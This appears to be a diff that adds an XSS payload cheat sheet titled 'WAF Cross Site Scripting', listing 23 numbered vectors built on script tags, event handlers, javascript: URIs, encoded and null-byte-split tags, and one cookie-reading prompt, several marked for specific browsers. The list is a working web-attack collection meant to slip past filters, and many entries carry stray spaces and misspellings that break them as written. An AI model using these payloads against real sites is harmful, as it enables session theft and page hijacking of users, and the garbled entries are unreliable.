@@ -1,0 +1,65 @@
+===========================================================================
+
+╦ ╦╔═╗╔═╗  ╔═╗┬─┐┌─┐┌─┐┌─┐  ╔═╗┬┌┬┐┌─┐  ╔═╗┌─┐┬─┐┬┌─┐┌┬┐┬┌┐┌┌─┐  
+║║║╠═╣╠╣   ║  ├┬┘│ │└─┐└─┐  ╚═╗│ │ ├┤   ╚═╗│  ├┬┘│├─┘ │ │││││ ┬  
+╚╩╝╩ ╩╚    ╚═╝┴└─└─┘└─┘└─┘  ╚═╝┴ ┴ └─┘  ╚═╝└─┘┴└─┴┴   ┴ ┴┘└┘└─┘
+
+===========================================================================
+
+
+1 - <Script> alert (1); </ script>
+
+2 - <Form action = "Javascript: alert (1)"> <input type = submit>
+
+3 - <Object data = "data: text / html; base64, PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4 =">
+<Object / data = // goo.gl/nlX0P?
+
+4 - <Applet code = "javascript: confirm (document.cookie);"> == Firefox Only 
+
+5 - <Svg / onload = prompt (1);>
+
+6 - <Marquee / onstart = confirm (2)> /
+
+7 - <Body onload = prompt (1);>
+
+8 - <Select autofocus onfocus = alert (1)>
+
+9 - <Textarea autofocus onfocus = alert (1)>
+
+10 - <Keygen autofocus onfocus = alert (1)>
+
+11 - <Video> <source onerror = "javascript: alert (1)">
+
+12 - <Marquee <marquee / onstart = confirm (2)> / onstart = confirm (1)>
+
+// IE Effective \\ 
+
+13 - <Command onmouseover
+= "\ X6A \ x61 \ x76 \ x61 \ x53 \ x43 \ x52 \ x49 \ x50 \ x54 \ x26 \ x63 \ x6F \ x6C \ x6F \ x6E \ x3B \ x63 \ x6F \ x6E \ x6 6 \ x69 \ x72 \ x6D \ x26 \ x6C \ x70 \ x61 \ x72 \ x3B \ x31 \ x26 \ x72 \ x70 \ x61 \ x72 \ x3B "> Save </ command>
+
+// IE Effective \\ 
+
+14 - <a onmouseover="javascript:window.onerror=alert;throw 1>
+
+15 - <Img src = x onerror = "javascript: window.onerror = alert; throw 1">
+
+16 - <Body / onload = javascript: window.onerror = eval; throw '= alert \ x281 \ x29';>
+
+17 - <Img style = "xss: expression (alert (0))"> || IE 7 
+
+18 - <Body onfocus = "loaction = 'javascript: alert (1)'"> 123
+
+19 - <a onmouseover=location='javascript:alert(1)'> click
+
+20 - <Script>
+Var x = ""; alert (1) //
+</ Script>
+
+21 - <a href="javascript:alert(1)//"> Click </a>
+
+22 -<Scri% 00pt> alert (1); </ scri% 00pt>
+
+22 - <Scri \ x00pt> alert (1); </ scri% 00pt>
+
+23 - <S% 00c% 00r% 00% 00ip% 00t> confirm (0); </ s% 00c% 00r% 00% 00ip% 00t>
+
